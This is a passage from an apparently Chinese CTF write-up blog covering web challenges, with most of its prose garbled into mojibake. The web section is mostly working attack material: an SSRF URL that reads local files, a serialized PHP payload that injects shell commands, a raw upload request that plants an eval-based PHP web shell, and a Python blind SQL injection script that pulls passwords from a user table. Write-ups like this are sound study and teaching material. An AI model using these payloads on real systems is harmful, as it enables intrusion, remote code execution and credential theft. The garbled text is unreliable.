Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>ç„¶åæ‹¿openbuffè¿›è¡Œè§£å¯†ï¼Œéœ€è¦ä¸‰ä¸ªå¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ä¸‰ç»„è¿›è¡Œæ’åˆ—ç»„åˆï¼Œè€Œä¸”å¼€å¤´è¿˜éœ€è¦åŠ ä¸Šctï¼Œå³å¯getflagã€‚</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmmæ²¡å•¥å¥½è¯´çš„ï¼Œè€ƒç‚¹å°±æ˜¯å­—ç¬¦ä¸²åè½¬ï¼Œä»¥åŠå¯¹å­—ç¬¦çš„æ•æ„Ÿæ€§ï¼Œè¿˜æœ‰å¯¹base92çš„äº†è§£ï¼Œé¢˜ç›®ç»™å‡ºäº†92åŸºæœ¬ä¸Šå¯ä»¥çŸ¥é“base92è¿™ç©æ„å„¿äº†ï¼Œåé¢çš„éš¾åº¦ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéœ€è¦ä¸€å®šçš„çµæ´»æ€§ã€‚</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>è¿™æ¬¡çš„webæ„Ÿè§‰å…¨æ˜¯phpï¼Œæ¯”è¾ƒâ€ç¡¬æ ¸â€ã€‚</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>é€šè¿‡post ä¼ admin=1å¹¶ä¸”ç”¨x-client-ipä¼ªé€ æœ¬åœ°ipï¼Œå³å¯åˆ°è¾¾ç”¨urlæ‰“ssrfçš„åœ°æ­¥ï¼Œé€šè¿‡æŒ‡å®šurlï¼Œæ‰“åˆ°çš„å†…å®¹ä¼šä»¥å›¾ç‰‡æ ¼å¼å­˜å‚¨åˆ°downloadç›®å½•ã€‚</p><p>è¿™é‡Œéœ€è¦ç”¨ fileåè®®ï¼Œè€Œä¸æ˜¯httpåè®®ã€‚</p><p>å¤§ä½¬æ˜¯è¿™æ ·æ„é€ urlçš„ï¼š</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>è€Œæˆ‘ï¼š</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>å¯èƒ½åˆæ˜¯ç¢°å·§æ‰“åˆ°çš„ï¼Ÿæˆ‘ä»¬å¯ä»¥è·å¾—source.phpçš„æºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å®é™…ä¸Šè€ƒçš„æ˜¯<code>libcurl</code>and<code>parse_url()</code>è§£æé—®é¢˜ã€‚</p><p>è¿™é‡Œå¯ä»¥å‚è€ƒ<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">ä¸€å¶é£˜é›¶å¸ˆå‚…</a>/)å†™çš„ä¸€ç¯‡åšæ–‡ã€‚</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>æ‰«ç›®å½•å¾—swpäº¤æ¢æ–‡ä»¶==&gt;vimæ¢å¤æ–‡ä»¶==&gt;å¾—åˆ°index.phpæºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹ä¸ºååºåˆ—åŒ–çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ„é€ getå‚æ•°ç»•è¿‡å‰é¢çš„æ£€æµ‹ï¼Œæ¥åˆ°postå‚æ•°å¤„ã€‚</p><p>æ„é€ getå‚æ•°:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,é€šè¿‡parse_strè¦†ç›–åŸæœ‰å˜é‡å³å¯ã€‚</p><p>ç„¶åè¿™é¢˜å¹¶ä¸æ˜¯ç»•è¿‡wakeupï¼Œå› ä¸ºåœ¨æ–°ç‰ˆphpä¸­å·²ç»ä¿®å¤è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦åœ¨echo($host)å¤„æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦è§„è§„çŸ©çŸ©åœ°è¿›è¡Œç»•è¿‡è¿‡æ»¤ï¼Œå°†æ„é€ çš„come Postè¿‡å»ï¼š</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸ç”¨ç©ºæ ¼æ‰§è¡Œå‘½ä»¤ï¼ˆ <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥ </a>ï¼‰ï¼Œä»¥åŠååºåˆ—åŒ–ä¸­ç§æœ‰å˜é‡çš„%00é—®é¢˜ï¼Œå¦‚æœä¸ä»¥urlç¼–ç å½¢å¼ï¼Œ%00å¹¶ä¸ä¼šèµ·ä½œç”¨ã€‚</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>è™½ç„¶æ²¡åšå‡ºæ¥ğŸ˜­ï¼Œä½†è¿˜æ˜¯è¦å­¦ä¹ ä¸€ä¸‹çš„ã€‚</p><p>åˆæ˜¯phpçš„ä»£ç å®¡è®¡é¢˜ã€‚</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>è€ƒå¯Ÿä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯æ•°ç»„ç»•è¿‡ï¼Œä»¥åŠunlink  <del>php/.</del> ç»•è¿‡ã€‚</p><p>æ„é€ æ•°æ®åŒ…å¦‚ä¸‹ï¼ˆæœ¬åœ°å¤ç°ï¼‰ï¼š</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>å†é€šè¿‡éå†æ–‡ä»¶åæ‹¿åˆ°æƒé™ï¼Œgetflagã€‚</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>æ—¶é—´ç›²æ³¨ + æ–‡ä»¶åæ‹¼æ¥  + ä¸Šä¼ æˆªæ–­ç»•è¿‡ï¼Œ%02é»‘è„¸æˆªæ–­ğŸ˜„ã€‚</p><p>æ„é€ å‡ºpayloadåå¯ä»¥ç›´æ¥æ‹¿ç»™sqlmapè·‘ï¼Ÿç¥å™¨ï¼ˆæœ‰æ—¶é—´å†æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼‰ã€‚ä¹Ÿå¯ä»¥è‡ªå·±å†™è„šæœ¬è·‘ï¼Œä¾‹å¦‚ä¸‹é¢å°±æ˜¯æˆ‘è®¤ä¸ºä¸€ä¸ªå†™çš„æ¯”è¾ƒç®€å•æ˜“ç”¨çš„è„šæœ¬ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#é‡ç”¨æ€§é«˜çš„ä»£ç æ˜¯å¥½ä»£ç </span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token 